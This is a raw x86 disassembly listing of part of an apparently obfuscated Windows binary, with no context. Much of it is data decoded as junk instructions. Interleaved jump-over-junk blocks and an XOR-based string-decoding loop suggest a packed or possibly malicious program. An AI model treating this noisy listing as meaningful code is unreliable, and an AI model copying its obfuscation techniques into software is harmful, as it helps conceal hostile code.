  403bb8:	xor    eax,DWORD PTR [bx-0x32b2]
  403bbd:	or     bh,ch
  403bbf:	inc    edi
  403bc0:	jmp    0xae9f:0xf2058766
  403bc7:	pusha  
  403bc8:	mov    ebp,0xc3deccf4
  403bcd:	lds    ebx,FWORD PTR [edi-0x19]
  403bd0:	stos   BYTE PTR es:[edi],al
  403bd1:	or     edi,DWORD PTR [eax+0x4b]
  403bd4:	out    0x93,al
  403bd6:	xchg   edi,eax
  403bd7:	test   al,0xaf
  403bd9:	cmp    BYTE PTR [edx-0x34],dl
  403bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bdd:	mov    ?,esp
  403bdf:	xor    ch,BYTE PTR [edx-0x11]
  403be2:	mov    DWORD PTR [ebx],edx
  403be4:	inc    ebx
  403be5:	dec    bp
  403be7:	gs (bad) 
  403be9:	push   ecx
  403bea:	adc    BYTE PTR [eax-0x1050b515],bh
  403bf0:	jl     0x403bed
  403bf2:	pop    ds
  403bf3:	dec    edi
  403bf4:	mov    ds:0xf91f6202,al
  403bf9:	outs   dx,BYTE PTR ds:[esi]
  403bfa:	fsubr  st,st(4)
  403bfc:	jne    0x403bf0
  403bfe:	aam    0xb7
  403c00:	cmc    
  403c01:	(bad)  
  403c02:	jecxz  0x403c25
  403c04:	xchg   bh,cl
  403c06:	inc    esi
  403c07:	aad    0xaf
  403c09:	xor    eax,0xafe9b93c
  403c0e:	stc    
  403c0f:	pusha  
  403c10:	mov    al,0x6e
  403c12:	pop    esp
  403c13:	sub    DWORD PTR [esi+ecx*1-0x6c],edx
  403c17:	(bad)  
  403c18:	div    BYTE PTR [edi+esi*2]
  403c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c1c:	jno    0x403c84
  403c1e:	stos   BYTE PTR es:[edi],al
  403c1f:	loop   0x403c92
  403c21:	pop    ecx
  403c22:	data16 hlt 
  403c24:	or     cl,0x14
  403c27:	mov    dh,0x74
  403c29:	jp     0x403c94
  403c2b:	rcr    DWORD PTR [esi],1
  403c2d:	ret    
  403c2e:	inc    ecx
  403c2f:	mov    ds:0xfa36bfa6,al
  403c34:	rcr    edi,cl
  403c36:	aam    0x39
  403c38:	pop    edi
  403c39:	scas   eax,DWORD PTR es:[edi]
  403c3a:	pop    ebx
  403c3b:	ja     0x403c60
  403c3d:	xchg   edi,eax
  403c3e:	push   ecx
  403c3f:	daa    
  403c40:	or     al,0x22
  403c42:	add    BYTE PTR ds:[ebp+0x1f],0xe0
  403c47:	(bad)  
  403c48:	retf   
  403c49:	ins    DWORD PTR es:[edi],dx
  403c4a:	hlt    
  403c4b:	mov    al,0xa2
  403c4d:	in     al,0x53
  403c4f:	stos   BYTE PTR es:[edi],al
  403c50:	rcl    DWORD PTR [ebx],1
  403c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c53:	sti    
  403c54:	mov    BYTE PTR [eax],bl
  403c56:	ins    DWORD PTR es:[edi],dx
  403c57:	cwde   
  403c58:	pop    ss
  403c59:	retf   
  403c5a:	jle    0x403cc1
  403c5c:	dec    ebx
  403c5d:	push   esp
  403c5e:	and    DWORD PTR [ebp-0x163e4191],edi
  403c64:	dec    ebp
  403c65:	mov    edx,cs
  403c67:	call   0xc9a9:0x95a67b52
  403c6e:	xor    eax,0xaa4030ab
  403c73:	aam    0xc7
  403c75:	inc    ebp
  403c76:	lock xor al,0x85
  403c79:	pushf  
  403c7a:	clc    
  403c7b:	mov    eax,ds:0x42c8be
  403c80:	mov    ecx,DWORD PTR ds:0x4278bb
  403c86:	sub    eax,ecx
  403c88:	sub    eax,DWORD PTR [eax+ecx*1]
  403c8b:	mov    eax,DWORD PTR [ebp-0x8]
  403c8e:	mov    ecx,0x7510857
  403c93:	push   esi
  403c94:	xor    eax,ecx
  403c96:	movzx  esi,BYTE PTR ds:0x427d03
  403c9d:	sub    DWORD PTR ds:0x4292d9,esi
  403ca3:	jmp    0x403da8
  403ca8:	cld    
  403ca9:	pop    eax
  403caa:	cwde   
  403cab:	daa    
  403cac:	pop    eax
  403cad:	out    0x93,eax
  403caf:	jnp    0x403d22
  403cb1:	or     esp,0x29
  403cb4:	pusha  
  403cb5:	test   eax,0x19c67e8c
  403cba:	jl     0x403d38
  403cbc:	push   esp
  403cbd:	jl     0x403d3b
  403cbf:	jl     0x403d3e
  403cc1:	push   esi
  403cc2:	adc    ah,ch
  403cc4:	lea    eax,[esi]
  403cc6:	retf   
  403cc7:	mov    esp,DWORD PTR [ebx-0x7a56bd40]
  403ccd:	inc    ecx
  403cce:	pop    esi
  403ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cd0:	js     0x403cda
  403cd2:	mov    ah,0x67
  403cd4:	loop   0x403d05
  403cd6:	in     eax,0xff
  403cd8:	dec    esi
  403cd9:	dec    edi
  403cda:	inc    esp
  403cdb:	data16 or BYTE PTR [esi],0xd1
  403cdf:	nop
  403ce0:	jle    0x403d0e
  403ce2:	mov    ecx,0x2a3317ed
  403ce7:	adc    al,0xd2
  403ce9:	cmp    ebx,edx
  403ceb:	xchg   BYTE PTR [edx+ecx*4+0x33],ah
  403cef:	ds xchg edx,eax
  403cf1:	rcl    DWORD PTR [edi+eiz*8-0x7e022362],cl
  403cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf9:	sub    DWORD PTR [eax-0x1b],ebx
  403cfc:	jno    0x403c8c
  403cfe:	mov    edx,DWORD PTR [ecx+0x39]
  403d01:	(bad)  
  403d02:	mov    ds:0xa44d7e5d,eax
  403d07:	cmp    dl,0xaf
  403d0a:	popa   
  403d0b:	dec    ebx
  403d0c:	mov    al,es:0xd9b49f31
  403d12:	out    dx,al
  403d13:	mov    dh,0xe2
  403d15:	jecxz  0x403d12
  403d17:	xor    ch,dh
  403d19:	es or  ebx,0xffffffb0
  403d1d:	into   
  403d1e:	mov    esi,0x7bd52d16
  403d23:	aad    0xac
  403d25:	arpl   WORD PTR [ebp+0x6e],bp
  403d28:	jae    0x403d5e
  403d2a:	xor    eax,DWORD PTR [edx]
  403d2c:	dec    ebp
  403d2d:	inc    edx
  403d2e:	adc    al,0x7d
  403d30:	cmp    edi,edx
  403d32:	dec    edx
  403d33:	inc    ebp
  403d34:	in     eax,0xa3
  403d36:	mov    cl,0x68
  403d38:	jmp    0x50a3aa33
  403d3d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  403d3f:	add    DWORD PTR [ebp-0x42],esp
  403d42:	fwait
  403d43:	call   0x1a59ec16
  403d48:	icebp  
  403d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4a:	mov    ebp,0x771261f
  403d4f:	(bad)  
  403d50:	mov    esi,0x39df0097
  403d55:	add    ebp,DWORD PTR [ebx-0x1f]
  403d58:	pop    esp
  403d59:	loope  0x403dc2
  403d5b:	ja     0x403cee
  403d5d:	lock mov ?,WORD PTR [eax-0x72]
  403d61:	and    BYTE PTR [esi+0x762a4180],cl
  403d67:	popf   
  403d68:	popa   
  403d69:	sbb    BYTE PTR [ebx+0x75f70ea2],cl
  403d6f:	popa   
  403d70:	ficom  DWORD PTR [esi+ebp*2+0x42]
  403d74:	test   dl,0x39
  403d77:	iret   
  403d78:	and    al,0xf0
  403d7a:	addr16 push cs
  403d7c:	push   ss
  403d7d:	fwait
  403d7e:	adc    BYTE PTR [eax+0x41586c33],ah
  403d84:	xor    bh,BYTE PTR [edx]
  403d86:	cmp    DWORD PTR [ecx-0x33aaf354],ecx
  403d8c:	push   0xe7d9d5a6
  403d91:	call   0x397cd5a7
  403d96:	pop    eax
  403d97:	mov    bl,0xd6
  403d99:	(bad)  
  403d9a:	xlat   BYTE PTR ds:[ebx]
  403d9b:	xchg   ebp,eax
  403d9c:	loope  0x403e1c
  403d9e:	xchg   edi,eax
  403d9f:	adc    eax,0xbbcfaec2
  403da4:	outs   dx,BYTE PTR ds:[esi]
  403da5:	mov    edi,0x9ebe88bf
  403daa:	jb     0x403dde
  403dac:	add    BYTE PTR [ecx+0x4275981d],al
  403db2:	add    BYTE PTR [esi+0x73],cl
  403db5:	add    BYTE PTR [eax],al
  403db7:	add    eax,esi
  403db9:	mov    DWORD PTR ds:0x4292d9,0x3d2c
  403dc3:	jmp    0x403ee9
  403dc8:	mov    DWORD PTR ds:0x4292d5,0x6a19
  403dd2:	mov    dl,BYTE PTR [ebp-0x1]
  403dd5:	jmp    0x403eda
  403dda:	sub    DWORD PTR [edi+edi*4+0x69d96176],eax
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	sub    al,0x65
  403de4:	sbb    BYTE PTR [esi],ch
  403de6:	lods   eax,DWORD PTR ds:[esi]
  403de7:	xchg   edx,eax
  403de8:	test   BYTE PTR [esi+0x3e],dl
  403deb:	sbb    BYTE PTR [esp+edi*2+0x54],bh
  403def:	jl     0x403e6d
  403df1:	jl     0x403dee
  403df3:	fdivrp st(2),st
  403df5:	outs   dx,DWORD PTR ds:[esi]
  403df6:	test   DWORD PTR [ecx],eax
  403df8:	pop    ds
  403df9:	pop    esp
  403dfa:	(bad)
  403dfe:	pop    eax
  403dff:	ds jno 0x403e1a
  403e02:	sbb    esi,ebp
  403e04:	pop    esp
  403e05:	es enter 0x353e,0x8d
  403e0a:	sub    eax,0xe2620b9a
  403e0f:	pop    esp
  403e10:	inc    edi
  403e11:	cmp    ah,cl
  403e13:	out    0x41,al
  403e15:	push   cs
  403e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e17:	jne    0x403dff
  403e19:	add    esi,ebp
  403e1b:	fwait
  403e1c:	cmp    DWORD PTR [edi+0x3f],esp
  403e1f:	jmp    0x8be9ff81
  403e24:	pop    edx
  403e25:	push   edx
  403e26:	retf   0x46b1
  403e29:	sbb    DWORD PTR [ebx+0x60b4ce52],esp
  403e2f:	sbb    DWORD PTR [edx+0x201a0d03],esi
  403e35:	jb     0x403e68
  403e37:	cmp    BYTE PTR ss:[eax-0x605a18ad],bl
  403e3e:	push   0x1dc7c7a3
  403e43:	add    eax,0x7c790817
  403e48:	pusha  
  403e49:	cmp    DWORD PTR [edi],ecx
  403e4b:	popf   
  403e4c:	sahf   
  403e4d:	dec    ebp
  403e4e:	xor    BYTE PTR ds:0x148737bc,al
  403e54:	aad    0x12
  403e56:	cmp    bl,al
  403e58:	mov    ebp,0x6a10ec46
  403e5d:	daa    
  403e5e:	add    eax,0x2c9d4b9d
  403e63:	jo     0x403e72
  403e65:	daa    
  403e66:	jnp    0x403e69
  403e68:	sub    BYTE PTR [ebp+eiz*1+0x6e600a9f],al
  403e6f:	mov    edx,0x35c6715b
  403e74:	xor    al,0x7f
  403e76:	jle    0x403e4c
  403e78:	push   ds
  403e79:	sbb    bh,BYTE PTR [esi+ebx*4]
  403e7c:	push   edx
  403e7d:	mov    bh,0x59
  403e7f:	cmp    esp,DWORD PTR [ecx-0x77085a97]
  403e85:	cdq    
  403e86:	add    BYTE PTR [edi-0x7b7a91b3],cl
  403e8c:	outs   dx,BYTE PTR ds:[esi]
  403e8d:	inc    DWORD PTR [edx]
  403e8f:	jge    0x403ee7
  403e91:	mov    bh,0x5a
  403e93:	test   eax,0x834d4ffb
  403e98:	sbb    ch,BYTE PTR [edi]
  403e9a:	add    BYTE PTR [esi-0x2f],ah
  403e9d:	jae    0x403e9d
  403e9f:	mov    eax,ds:0xef3c8d80
  403ea4:	add    DWORD PTR [edi+0x53],ebx
  403ea7:	inc    esp
  403ea8:	jmp    0xdc5b12c3
  403ead:	add    esp,ebp
  403eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eb0:	mov    ds:0x6f353ce2,eax
  403eb5:	cmp    eax,ebp
  403eb7:	mov    DWORD PTR [ebp+eiz*4-0x1b],ebp
  403ebb:	sti    
  403ebc:	jmp    0x8e9e83c0
  403ec1:	lods   eax,DWORD PTR ds:[esi]
  403ec2:	xchg   edx,eax
  403ec3:	adc    ecx,0x847e3605
  403ec9:	int3   
  403eca:	pusha  
  403ecb:	mov    eax,0x74d790e7
  403ed0:	mov    ds:0x6ca0e252,eax
  403ed5:	inc    esi
  403ed6:	cmp    ah,BYTE PTR [ecx]
  403ed8:	add    DWORD PTR [esi-0x57faab78],esp
  403ede:	mov    DWORD PTR ds:0x427598,0xc0f
  403ee8:	inc    eax
  403ee9:	cmp    eax,0x40
  403eec:	mov    DWORD PTR ds:0x4292cd,0x3a6f
  403ef6:	jb     0x403dc8
  403efc:	mov    edx,DWORD PTR ds:0x4292e9
  403f02:	mov    edx,DWORD PTR [edx]
  403f04:	xor    DWORD PTR ds:0x427d07,edx
  403f0a:	mov    edx,DWORD PTR [ebp-0x8]
  403f0d:	xor    eax,0x54c0
  403f12:	mov    eax,DWORD PTR [ebp-0xc]
  403f15:	xor    edx,ecx
  403f17:	adc    DWORD PTR ds:0x4275a8,0x4292d1
  403f21:	jmp    0x404026
  403f26:	push   cs
  403f27:	ds add al,0xd
  403f2a:	(bad)  
  403f2b:	fld    QWORD PTR ds:0x74fb2bdd
  403f31:	sub    DWORD PTR [ebp+0x168b3002],eax
  403f37:	sbb    edi,DWORD PTR [esp+edi*2+0x54]
  403f3b:	jl     0x403fb9
  403f3d:	jl     0x403f3d
  403f3f:	arpl   WORD PTR [edi],bx
  403f41:	or     eax,0x7116fe5c
  403f46:	pop    edx
  403f47:	dec    esp
  403f48:	add    bh,bl
  403f4a:	mov    ebp,0x1a08c15b
  403f4f:	enter  0x7913,0xb4
  403f53:	outs   dx,DWORD PTR ds:[esi]
  403f54:	sub    al,0x10
  403f56:	fld    QWORD PTR cs:[ecx+0x15]
  403f5a:	push   es
  403f5b:	jle    0x403f07
  403f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f5e:	and    BYTE PTR [eax],bl
  403f60:	(bad)  [esi+eax*2-0x4a]
  403f64:	shl    edx,1
  403f66:	inc    edx
  403f67:	jmp    0x403f99
  403f69:	push   ss
  403f6a:	aas    
  403f6b:	cmc    
  403f6c:	xchg   eax,ecx
  403f6e:	sbb    DWORD PTR [ebx+0x52d500c2],esp
  403f74:	out    dx,eax
  403f75:	in     eax,0xc4
  403f77:	stos   BYTE PTR es:[edi],al
  403f78:	repnz mov cl,0x3f
  403f7b:	scas   eax,DWORD PTR es:[edi]
  403f7c:	repz mov al,0xaf
  403f7f:	mov    bh,0x38
  403f81:	jmp    0x9ce:0xfe824191
  403f88:	gs mov esp,0x9c214a45
  403f8e:	fidiv  WORD PTR ds:0x9485639c
  403f94:	sub    al,0xd7
  403f96:	stos   DWORD PTR es:[edi],eax
  403f97:	fs pop esp
  403f99:	packsswb mm1,QWORD PTR [edi+0x7737564a]
  403fa0:	imul   edx,DWORD PTR [ebp+0x44],0xf80a6a9d
  403fa7:	jb     0x404005
  403fa9:	iret   
  403faa:	mov    eax,ds:0x9958cb6a
  403faf:	(bad)  
  403fb0:	std    
  403fb1:	ins    BYTE PTR es:[edi],dx
  403fb2:	std    
  403fb3:	sbb    dh,dl
  403fb5:	rcl    ah,0x84
  403fb8:	popf   
  403fb9:	mov    esi,0x271763d3
  403fbe:	inc    ecx
  403fbf:	inc    ebp
  403fc0:	stos   BYTE PTR es:[edi],al
  403fc1:	mov    al,ds:0xe1c58aa5
  403fc6:	hlt    
  403fc7:	popf   
  403fc8:	shl    BYTE PTR [ecx],1
  403fca:	push   edx
  403fcb:	fsubr  QWORD PTR [ebx+ecx*1+0x6]
  403fcf:	or     al,0x45
  403fd1:	call   0xec7d4f60
  403fd6:	fisttp DWORD PTR [edx-0x6f]
  403fd9:	fs int3 
  403fdb:	or     BYTE PTR [edx+0xc52a662],al
  403fe1:	inc    esi
  403fe2:	je     0x403fdf
  403fe4:	pop    es
  403fe5:	imul   ebx,DWORD PTR [edx+0x17],0x4b
  403fe9:	mov    cl,BYTE PTR [ebx]
  403feb:	lods   al,BYTE PTR ds:[esi]
  403fec:	in     eax,dx
  403fed:	dec    esi
  403fee:	jmp    0xffb1:0x13c11f0e
  403ff5:	dec    esi
  403ff6:	in     al,0xee
  403ff8:	push   0x688b8a02
  403ffd:	pusha  
  403ffe:	pop    ebp
  403fff:	inc    ecx
  404000:	push   0x65
  404002:	sub    al,0x94
  404004:	or     esi,DWORD PTR [edx+0x26689fb2]
  40400a:	adc    dl,BYTE PTR [ebp-0x3f154ed5]
  404010:	mov    eax,ds:0xf318c65
  404015:	fisub  DWORD PTR [edx+0x4c]
  404018:	mov    edx,0xed0b050a
  40401d:	sbb    bh,BYTE PTR [ebx+ebp*4-0x43]
  404021:	icebp  
  404022:	or     al,0xfc
  404024:	xor    BYTE PTR [ebp+0x5c7d603],0x8a
  40402b:	enter  0x42,0xaf
  40402f:	jp     0x404031
  404031:	add    BYTE PTR [ebx],bh
  404033:	rol    bh,1
  404035:	add    eax,0x4292c1
  40403a:	cmp    bh,BYTE PTR [esi+0x0]
  40403d:	add    BYTE PTR [edi],cl
  40403f:	test   BYTE PTR [ecx-0x7efffffd],ah
  404045:	and    eax,0x42c88a
  40404a:	add    BYTE PTR [eax],al
  40404c:	add    BYTE PTR [eax],al
  40404e:	mov    eax,ds:0x42c88a
  404053:	inc    eax
  404054:	mov    ds:0x42c88a,eax
  404059:	cmp    DWORD PTR ds:0x42c88a,0xa
  404060:	jne    0x404071
  404066:	push   0x1f92
  40406b:	call   DWORD PTR ds:0x427c47
  404071:	cmp    DWORD PTR ds:0x42c88a,0x9
  404078:	jne    0x404089
  40407e:	mov    eax,ds:0x42c88a
  404083:	inc    eax
  404084:	mov    ds:0x42c88a,eax
  404089:	cmp    DWORD PTR ds:0x42c88a,0x1a
  404090:	jb     0x40404e
  404096:	push   ebx
  404097:	jmp    0x40419c
  40409c:	mov    fs,WORD PTR [edi]
  40409e:	mov    al,0x47
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	jnp    0x404040
  4040a3:	stc    
  4040a4:	sbb    al,ch
  4040a6:	(bad)  
  4040a7:	nop
  4040a8:	dec    esi
  4040a9:	shl    BYTE PTR [edi],cl
  4040ab:	jne    0x4040bb
  4040ad:	sbb    bh,BYTE PTR [esp+edi*2+0x54]
  4040b1:	jl     0x40412f
  4040b3:	jl     0x40407b
  4040b5:	jns    0x4040c2
  4040b7:	jb     0x404113
  4040b9:	or     DWORD PTR [ebp+0x67a3251b],eax
  4040bf:	push   edi
  4040c0:	mov    eax,ds:0x39a67800
  4040c5:	jns    0x4040eb
  4040c7:	lahf   
  4040c8:	xchg   ebp,eax
  4040c9:	dec    esi
  4040ca:	sub    BYTE PTR [ecx-0x6a],ch
  4040cd:	aas    
  4040ce:	adc    dl,dl
  4040d0:	sbb    BYTE PTR [edi-0x6c],0xf8
  4040d4:	fs xor dh,bl
  4040d7:	imul   ebp,ecx,0x19061caa
  4040dd:	(bad)  [eax]
  4040df:	and    BYTE PTR [edx],0x27
  4040e2:	pop    esp
  4040e3:	jmp    0xc2f8feb4
  4040e8:	fbstp  TBYTE PTR [ebx-0xc]
  4040eb:	cli    
  4040ec:	mov    cl,0xdd
  4040ee:	cdq    
  4040ef:	sub    BYTE PTR [edi+0x44],bl
  4040f2:	fadd   st,st(7)
  4040f4:	fs into 
  4040f6:	addr16 popf 
  4040f8:	or     edi,ebp
  4040fa:	mov    eax,ds:0x52ec9db3
  4040ff:	jle    0x40412e
  404101:	aaa    
  404102:	int3   
  404103:	push   eax
  404104:	mov    cs,WORD PTR [edi+0x4fbf2e75]
  40410a:	(bad)  [eax-0x69]
  40410d:	sub    BYTE PTR [ebx],0xf8
  404110:	mov    esi,esi
  404112:	adc    al,0x6d
  404114:	ins    DWORD PTR es:[edi],dx
  404115:	xchg   edx,eax
  404116:	or     edx,DWORD PTR [edx]
  404118:	imul   eax,DWORD PTR [ecx],0x76
  40411b:	dec    ebx
  40411c:	jmp    FWORD PTR [ecx+0x36]
  40411f:	jne    0x40412f
  404121:	or     al,0xe7
  404123:	and    al,0xbd
  404125:	and    al,cl
  404127:	mov    edi,0x92cf6c67
  40412c:	(bad)  
  40412d:	cmp    eax,0x640f6783
  404132:	jg     0x4041a7
  404134:	aad    0x0
  404136:	pop    ebx
  404137:	and    dh,ch
  404139:	test   al,0xd4
  40413b:	add    dl,BYTE PTR [ecx-0xe4ed15c]
  404141:	adc    ebx,edx
  404143:	ss dec esp
  404145:	dec    esi
  404146:	jne    0x4041b1
  404148:	mov    eax,0xef05fd9b
  40414d:	push   edi
  40414e:	dec    edx
  40414f:	push   edx
  404150:	jns    0x40415b
  404152:	retf   0xb45c
  404155:	cmp    eax,0xf40bd481
  40415a:	rcl    DWORD PTR [edi],1
  40415c:	jmp    0x6d1c:0xaa9aad7f
  404163:	ss icebp 
  404165:	scas   al,BYTE PTR es:[edi]
  404166:	loopne 0x40418b
  404168:	jnp    0x4041b6
  40416a:	or     eax,0x7f3a7df6
  40416f:	sahf   
  404170:	imul   eax,DWORD PTR [edx-0x3f],0xc17c00cf
  404177:	lods   al,BYTE PTR ds:[esi]
  404178:	xchg   ebp,eax
  404179:	lock sub bl,BYTE PTR [eax]
  40417c:	xchg   ebp,eax
  40417d:	adc    bl,BYTE PTR [edx-0x2b]
  404180:	popa   
  404181:	das    
  404182:	jmp    0xb01615a6
  404187:	es sub eax,0x6097b1b2
  40418d:	xor    bl,BYTE PTR [edi+0x71]
  404190:	dec    ebx
  404191:	sub    al,0x5
  404193:	xor    dh,dl
  404195:	shl    DWORD PTR [ecx-0x6b964c34],0x7f
  40419c:	push   edi
  40419d:	mov    edi,DWORD PTR [ebp+0x8]
  4041a0:	mov    eax,0x8a42
  4041a5:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4041aa:	jmp    0x4042af
  4041af:	sbb    eax,0x673c6c22
  4041b4:	mov    dl,0xbd
  4041b6:	std    
  4041b7:	adc    ah,BYTE PTR [ebx+0x6edf3a08]
  4041bd:	(bad)  
  4041be:	cld    
  4041bf:	data16 sbb bh,BYTE PTR [esp+edi*2+0x54]
  4041c4:	jl     0x404242
  4041c6:	jl     0x404151
  4041c8:	adc    bh,BYTE PTR [eax]
  4041ca:	mov    al,ds:0xd31e45a5
  4041cf:	cmp    esp,edx
  4041d1:	adc    al,0x1f
  4041d3:	sub    al,0xc
  4041d5:	pop    ebp
  4041d6:	add    al,0xe9
  4041d8:	push   0x5dae9a50
  4041dd:	sbb    edx,DWORD PTR [ecx-0x64]
  4041e0:	test   al,0xaa
  4041e2:	fdivr  QWORD PTR [edi+0x77bf8a92]
  4041e8:	jb     0x40425b
  4041ea:	inc    esi
  4041eb:	and    DWORD PTR ds:0x22feb4d6,edi
  4041f1:	or     al,0x61
  4041f3:	shr    DWORD PTR [eax-0x7cf25201],0x9e
  4041fa:	aas    
  4041fb:	sti    
  4041fc:	mov    bl,0x5d
  4041fe:	sbb    eax,DWORD PTR [eax]
  404200:	xor    cl,dh
  404202:	retf   
  404203:	dec    ebx
  404204:	adc    bh,BYTE PTR [edx+0x6a]
  404207:	das    
  404208:	dec    ecx
  404209:	xchg   ebx,eax
  40420a:	popa   
  40420b:	mov    dh,0xe
  40420d:	mov    dh,0x5a
  40420f:	jp     0x40423f
  404211:	fld    TBYTE PTR [esi-0x5c7bd076]
  404217:	mov    DWORD PTR [edx],0x2e582323
  40421d:	scas   eax,DWORD PTR es:[edi]
  40421e:	sub    eax,0x9a108b11
  404223:	xchg   edi,eax
  404224:	lods   al,BYTE PTR ds:[esi]
  404225:	sub    BYTE PTR [ebx+0x74be8272],dh
  40422b:	cmp    ecx,ebp
  40422d:	push   eax
  40422e:	cwde   
  40422f:	into   
  404230:	lea    ecx,[edi+0x68]
  404233:	jo     0x4041ec
  404235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404236:	clc    
  404237:	or     eax,0x943cdf00
  40423c:	ds ins DWORD PTR es:[edi],dx
  40423e:	jecxz  0x404265
  404240:	and    dh,BYTE PTR [esi+0x15ce96aa]
  404246:	sub    BYTE PTR [ebp-0x789aa58],bh
  40424c:	loopne 0x4041d0
  40424e:	pop    edx
  40424f:	and    al,0x49
  404251:	lock mov esi,0x626e81d2
  404257:	and    eax,0x14f62d92
  40425c:	inc    ebx
  40425d:	and    DWORD PTR [edx],esi
  40425f:	push   edi
  404260:	mov    ebp,0x66ececac
  404265:	pop    eax
  404266:	push   ecx
  404267:	ja     0x404256
  404269:	pop    ebp
  40426a:	inc    esi
  40426b:	nop
  40426c:	inc    edx
  40426d:	mov    ch,0xf5
  40426f:	int    0x77
  404271:	call   0x50eb1b0
  404276:	nop
  404277:	bound  ebx,QWORD PTR [edi+0x42]
  40427a:	pop    esp
  40427b:	mov    esi,0x714f606
  404280:	xchg   esp,eax
  404281:	push   eax
  404282:	or     eax,0xfcbd51a9
  404287:	jl     0x404288
  404289:	adc    al,0x52
  40428b:	xlat   BYTE PTR ds:[ebx]
  40428c:	gs stos DWORD PTR es:[edi],eax
  40428e:	sbb    eax,0x59c6b709
  404293:	mov    ds:0x8917cd18,eax
  404298:	lock cmp eax,0x31d7c70
  40429e:	aam    0x2a
  4042a0:	mov    BYTE PTR fs:[eax+0x5f],al
  4042a4:	ss mov al,0x68
  4042a7:	xchg   edi,eax
  4042a8:	cmc    
  4042a9:	cs jmp 0x8bf:0xe588a502
  4042b1:	cmp    eax,DWORD PTR [eax]
  4042b3:	add    BYTE PTR [esi+0x3],ah
  4042b6:	(bad)  
  4042b7:	movzx  eax,ax
  4042ba:	mov    DWORD PTR [ebp-0x14],eax
  4042bd:	mov    eax,DWORD PTR [ebp+0x8]
  4042c0:	movzx  eax,WORD PTR [eax+edx*4]
  4042c4:	xor    eax,0x8a42
  4042c9:	add    eax,edi
  4042cb:	mov    edi,DWORD PTR [ebp-0x14]
  4042ce:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4042d2:	mov    eax,DWORD PTR [ebp-0xc]
  4042d5:	inc    edx
  4042d6:	cmp    edx,eax
  4042d8:	jmp    0x4043dd
  4042dd:	daa    
  4042de:	mov    edi,0x79794fe9
  4042e3:	mov    ecx,0xc966f157
  4042e8:	dec    esi
  4042e9:	hlt    
  4042ea:	in     al,0x3c
  4042ec:	ficomp WORD PTR [esi+0x1d]
  4042ef:	jl     0x40436d
  4042f1:	push   esp
  4042f2:	jl     0x404370
  4042f4:	jl     0x4042d4
  4042f6:	out    dx,al
  4042f7:	xchg   DWORD PTR ds:0x907760a7,edi
  4042fd:	out    0xfd,al
  4042ff:	inc    edi
  404300:	dec    esp
  404301:	in     al,0xf4
  404303:	ret    
  404304:	xor    eax,0xcec9a046
  404309:	xchg   edx,eax
  40430a:	sub    al,0xd4
  40430c:	adc    cl,cl
  40430e:	pop    ds
  40430f:	fdivr  DWORD PTR [edx+0x51]
  404312:	out    0xae,eax
  404314:	addr16 adc ebp,0x38
  404318:	sbb    ch,BYTE PTR [esi]
  40431a:	cmp    esp,DWORD PTR [edi-0x295e4f82]
  404320:	out    0x33,al
  404322:	test   BYTE PTR [eax+eax*4-0x58edca2d],bl
  404329:	ds xchg ebp,eax
  40432b:	arpl   WORD PTR [edi+ecx*1+0x1c5a120e],bx
  404332:	(bad)  
  404333:	out    dx,al
  404334:	lahf   
  404335:	xchg   ebx,eax
  404336:	sbb    edx,DWORD PTR [eax+0x7ef0e743]
  40433c:	mov    ah,0x19
  40433e:	call   0x7fdfc133
  404343:	pusha  
  404344:	jl     0x404316
  404346:	cmp    ebx,DWORD PTR [eax]
  404348:	pushf  
  404349:	into   
  40434a:	(bad)  
  40434b:	loop   0x404333
  40434d:	cmc    
  40434e:	cmp    al,0x25
  404350:	jns    0x404342
  404352:	push   esp
  404353:	pop    edi
  404354:	push   edx
  404355:	(bad)  
  404356:	ds dec eax
  404358:	and    BYTE PTR [ebx],ch
  40435a:	inc    ebp
  40435b:	mov    edx,0x46c43e9a
  404360:	ss mov ch,0x86
  404363:	pop    ebx
  404364:	mov    bh,0xaa
  404366:	and    DWORD PTR [esi],0xeafdc129
  40436c:	dec    ecx
  40436d:	jo     0x40430f
  40436f:	cmp    ebx,esp
  404371:	pop    ebp
  404372:	xchg   edx,eax
  404373:	push   edi
  404374:	jg     0x404376
  404376:	outs   dx,BYTE PTR ds:[esi]
  404377:	jne    0x404309
  404379:	data16 es adc al,0xcf
  40437d:	imul   edx,DWORD PTR [eax-0x62],0x58
  404381:	loopne 0x404311
  404383:	add    dh,bh
  404385:	cmp    bl,BYTE PTR [eax-0x19]
  404388:	sub    DWORD PTR [edx+eiz*4-0x7ded00de],ecx
  40438f:	fld    DWORD PTR [edx+0x35]
  404392:	ds and dl,ah
  404395:	or     DWORD PTR [ebp-0x1f],esi
  404398:	adc    DWORD PTR [esi+0x65],ebx
  40439b:	icebp  
  40439c:	mov    edi,0xef616eb2
  4043a1:	out    dx,eax
  4043a2:	outs   dx,DWORD PTR ds:[esi]
  4043a3:	sub    esp,DWORD PTR [edx+edi*4-0x68]
  4043a7:	(bad)  
  4043a8:	ds pop edx
  4043aa:	sub    DWORD PTR ds:0x311ae078,ebp
  4043b0:	push   0x7c
  4043b2:	and    ebx,edi
  4043b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b5:	cmp    DWORD PTR [ebx+0x6e3d80ce],0x7e13d305
  4043bf:	xor    DWORD PTR [ecx],ecx
  4043c1:	pop    eax
  4043c2:	ins    DWORD PTR es:[edi],dx
  4043c3:	lods   al,BYTE PTR ds:[esi]
  4043c4:	add    eax,0xe8195cfa
  4043c9:	jle    0x404410
  4043cb:	fs aas 
  4043cd:	out    dx,al
  4043ce:	lahf   
  4043cf:	mov    ds:0xd6d5f49a,al
  4043d4:	or     ah,ch
  4043d6:	pop    edx
  4043d7:	inc    edi
